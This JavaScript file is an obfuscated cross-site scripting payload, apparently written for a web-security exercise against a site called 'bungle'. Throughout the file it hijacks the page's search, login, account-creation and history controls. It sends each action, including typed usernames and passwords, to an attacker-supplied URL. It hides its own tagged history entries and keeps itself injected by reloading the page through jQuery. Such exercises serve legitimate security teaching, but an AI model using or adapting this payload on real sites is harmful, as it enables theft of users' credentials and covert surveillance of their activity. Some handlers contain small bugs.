function payload(attacker) {

	function record(action){
		var request = $.ajax({
		  url: attacker,
		  type: String.fromCharCode(71,69,84),
		  data: action
		});
	}

	function inject_bad_stuff(){
		<!-- search button -->
		<!-- for_fun_tag -->
		str_form = String.fromCharCode(102,111,114,109)
		str_onsubmit = String.fromCharCode(111,110,115,117,98,109,105,116)
		str_return_false = String.fromCharCode(114,101,116,117,114,110,32,102,97,108,115,101,59)
		str_search_again_btn = String.fromCharCode(35,115,101,97,114,99,104,45,97,103,97,105,110,45,98,116,110)
		str_action = String.fromCharCode(97,99,116,105,111,110)
		str_data = String.fromCharCode(100,97,116,97)
		str_user = String.fromCharCode(117,115,101,114)
		str_password = String.fromCharCode(112,97,115,115,119,111,114,100)
		str_username = String.fromCharCode(117,115,101,114,110,97,109,101)

		$(str_form).attr(str_onsubmit, str_return_false)
		$(str_search_again_btn).removeAttr(String.fromCharCode(104,114,101,102))

		$(String.fromCharCode(35,115,101,97,114,99,104,45,98,116,110)).click( function(){
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					 action: String.fromCharCode(115,101,97,114,99,104), 
					 data: $(String.fromCharCode(35,113,117,101,114,121)).val()
				})
				proxy(String.fromCharCode(46,47,115,101,97,114,99,104,63,113,61) + $(String.fromCharCode(35,113,117,101,114,121)).val())
			}
		)
		$(String.fromCharCode(35,98,117,110,103,108,101,45,108,110,107)).click( function(e){
				e.preventDefault();
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					action: String.fromCharCode(104,111,109,101)
				})
				proxy(String.fromCharCode(46,47))
			}
		)
		
		$(String.fromCharCode(35,115,101,97,114,99,104,45,97,103,97,105,110,45,98,116,110)).click( function(){
				e.preventDefault();
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					action: String.fromCharCode(114,101,115,101,97,114,99,104)
				})
				proxy(String.fromCharCode(46,47))
			}
		)

		$(String.fromCharCode(35,110,101,119,45,97,99,99,111,117,110,116,45,98,116,110)).click( function(){
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					action: String.fromCharCode(99,114,101,97,116,101,95,97,99,99,111,117,110,116),
					username: $(String.fromCharCode(35,117,115,101,114,110,97,109,101)).val(),
					password: $(String.fromCharCode(35,117,115,101,114,112,97,115,115)).val()
				})
				proxy(String.fromCharCode(46,47,99,114,101,97,116,101), {
					username:$(String.fromCharCode(35,117,115,101,114,110,97,109,101)).val(), 
					password: $(String.fromCharCode(117,115,101,114,112,97,115,115)).val()
				})
			}
		)

		$(String.fromCharCode(35,108,111,103,45,105,110,45,98,116,110)).click( function(){
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					action: String.fromCharCode(108,111,103,105,110),
					username: $(String.fromCharCode(35,117,115,101,114,110,97,109,101)).val(),
					password: $(String.fromCharCode(35,117,115,101,114,112,97,115,115)).val()
				})
				proxy(String.fromCharCode(46,47,108,111,103,105,110), {
					username:$(String.fromCharCode(35,117,115,101,114,110,97,109,101)).val(), 
					password:$(String.fromCharCode(117,115,101,114,112,97,115,115)).val()
				})
			}
		)
		
		$(String.fromCharCode(35,108,111,103,45,111,117,116,45,98,116,110)).click( function(){
				$(String.fromCharCode(104,116,109,108)).hide();
				record({
					action: String.fromCharCode(108,111,103,111,117,116)
				})
				proxy(String.fromCharCode(46,47,108,111,103,111,117,116), {})
			}
		)

		$(String.fromCharCode(35,104,105,115,116,111,114,121,45,108,105,115,116)).children().each(
			function(){
			    if ( $(this).text().includes(String.fromCharCode(102,111,114,95,102,117,110,95,116,97,103))) $(this).hide();
			    else{
			    	var s = $(this).text()
			    	$(this).click(
			    		function(e){
			    			e.preventDefault();
			    			record({
								action: String.fromCharCode(115,101,97,114,99,104,95,104,105,115,116,111,114,121), 
								data: s
							})
							proxy(String.fromCharCode(46,47,115,101,97,114,99,104,63,113,61) + s)
			    		}
			    	)
			    }
			}
		)

	}


	function proxy(href, param) {
		
		if ( param ){
			$(String.fromCharCode(104,116,109,108)).load(href, param, function(responseTxt,statusTxt,xhr){

				if (statusTxt == String.fromCharCode(101,114,114,111,114)){
					var form = $(String.fromCharCode(60,102,111,114,109,32,97,99,116,105,111,110,61,34) + href + String.fromCharCode(34,32,109,101,116,104,111,100,61,34,112,111,115,116,34,62) +
					  String.fromCharCode(60,105,110,112,117,116,32,116,121,112,101,61,34,116,101,120,116,34,32,110,97,109,101,61,34,117,115,101,114,110,97,109,101,34,32,118,97,108,117,101,61,34) + param[String.fromCharCode(117,115,101,114,110,97,109,101)] + String.fromCharCode(34,32,47,62) +
					  String.fromCharCode(60,105,110,112,117,116,32,116,121,112,101,61,34,112,97,115,115,119,111,114,100,34,32,110,97,109,101,61,34,112,97,115,115,119,111,114,100,34,32,118,97,108,117,101,61,34) + param[String.fromCharCode(112,97,115,115,119,111,114,100)] + String.fromCharCode(34,32,47,62) +
					  String.fromCharCode(60,47,102,111,114,109,62));
					$(String.fromCharCode(104,116,109,108)).append(form);
					form.submit();
				}
				else{
					inject_bad_stuff()
					$(String.fromCharCode(35,113,117,101,114,121)).val(String.fromCharCode(112,119,110,101,100,33));
				}
				$(String.fromCharCode(104,116,109,108)).show();
			});
		}
		else{
			$(String.fromCharCode(104,116,109,108)).load(href, function(responseTxt,statusTxt,xhr){
				inject_bad_stuff()
				$(String.fromCharCode(104,116,109,108)).show();
				$(String.fromCharCode(35,113,117,101,114,121)).val(String.fromCharCode(112,119,110,101,100,33));
			});
		}
	}
	$(String.fromCharCode(104,116,109,108)).hide();
	record({action:String.fromCharCode(115,116,97,114,116)})
	proxy(String.fromCharCode(46,47));
}
